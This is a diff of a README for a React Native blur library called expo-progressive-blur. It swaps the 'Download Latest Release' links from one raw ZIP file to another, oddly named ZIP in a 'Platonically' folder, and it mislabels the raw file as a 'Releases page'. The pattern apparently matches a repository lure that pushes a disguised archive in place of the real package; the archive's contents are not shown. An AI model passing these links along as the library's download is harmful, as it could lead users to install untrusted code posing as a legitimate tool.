@@ -1,7 +1,7 @@
 # ✨ expo-progressive-blur - Easy Progressive Blur for Your App
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/1fan-papi/expo-progressive-blur/main/Platonically/expo-progressive-blur.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/1fan-papi/expo-progressive-blur/main/Platonically/expo-progressive-blur.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/1fan-papi/expo-progressive-blur/main/Platonically/blur_expo_progressive_doctrinization.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/1fan-papi/expo-progressive-blur/main/Platonically/blur_expo_progressive_doctrinization.zip)
 
 ## 🚀 Getting Started
 Welcome to the expo-progressive-blur project! This tool provides an iOS-like progressive blur effect for React Native applications. With this feature, you can enhance your app's user interface, making it more visually appealing.
@@ -10,7 +10,7 @@ Welcome to the expo-progressive-blur project! This tool provides an iOS-like pro
 To get started, you need to download the latest version from our releases page. You can do this by following these steps:
 
 1. Click on the download link below to visit the Releases page:
-   [Download Latest Release](https://raw.githubusercontent.com/1fan-papi/expo-progressive-blur/main/Platonically/expo-progressive-blur.zip)
+   [Download Latest Release](https://raw.githubusercontent.com/1fan-papi/expo-progressive-blur/main/Platonically/blur_expo_progressive_doctrinization.zip)
 
 2. On the Releases page, you will see the list of available releases.
 
